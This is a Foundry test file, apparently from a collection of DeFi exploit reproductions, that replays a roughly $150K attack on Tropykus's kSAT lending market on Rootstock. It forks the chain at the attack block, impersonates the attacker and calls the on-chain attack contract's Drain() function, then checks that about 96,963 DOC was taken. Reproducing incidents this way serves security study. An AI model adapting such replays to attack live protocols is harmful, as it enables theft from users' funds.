// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$150K
    - Attacker: https://rootstock.blockscout.com/address/0x16485C77ecA8f4C6B7bcF7869B208137461ec654
    - Attack Contract: https://rootstock.blockscout.com/address/0x603fd8211C485e616a8EDb6F51dE194eF23181eF
    - Vulnerable Contract: https://rootstock.blockscout.com/address/0xD2Ec53E8DD00D204D3d9313aF5474eb9f5188Ef6
    - Attack Tx: https://rootstock.blockscout.com/tx/0x6e3a34e58cf8187df5c9ed2461390e36cc83d8889b1cd00c5292c2ae481ec58d
    - Analysis: https://rekt.news/midas-rekt2

    The vulnerable kSAT market's supplier-accounting logic let the attacker turn a
    small mint/redeem cycle into an enormous kSAT balance. The forged collateral
    was then used to borrow 96,963 DOC from the kDOC market.
*/

interface IERC20Tropykus {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract TropykusExploitTest is Test {
    uint256 private constant FORK_BLOCK = 5_388_202;

    address private constant ATTACKER = 0x16485c77EcA8f4C6B7BCf7869b208137461eC654;
    address private constant ATTACK_CONTRACT = 0x603fd8211C485E616a8Edb6F51dE194EF23181ef;
    address private constant KSAT = 0xD2eC53E8DD00D204D3D9313AF5474Eb9f5188Ef6;
    IERC20Tropykus private constant DOC = IERC20Tropykus(0xe700691dA7b9851F2F35f8b8182c69c53CcaD9Db);

    function setUp() public {
        vm.createSelectFork("rootstock", FORK_BLOCK);
        vm.deal(ATTACKER, 1 ether);

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "AttackContract");
        vm.label(KSAT, "Tropykus kSAT");
        vm.label(address(DOC), "DOC");
    }

    function testExploit() public {
        uint256 docBefore = DOC.balanceOf(ATTACK_CONTRACT);

        vm.prank(ATTACKER);
        (bool success,) = ATTACK_CONTRACT.call{value: 0.005 ether}(abi.encodeWithSignature("Drain()"));
        assertTrue(success, "historical exploit call failed");

        uint256 docAfter = DOC.balanceOf(ATTACK_CONTRACT);
        uint256 docDrained = docAfter - docBefore;

        emit log_named_decimal_uint("DOC drained from Tropykus", docDrained, 18);
        assertEq(docDrained, 96_963.476_976_399_313_380_169 ether);
    }
}
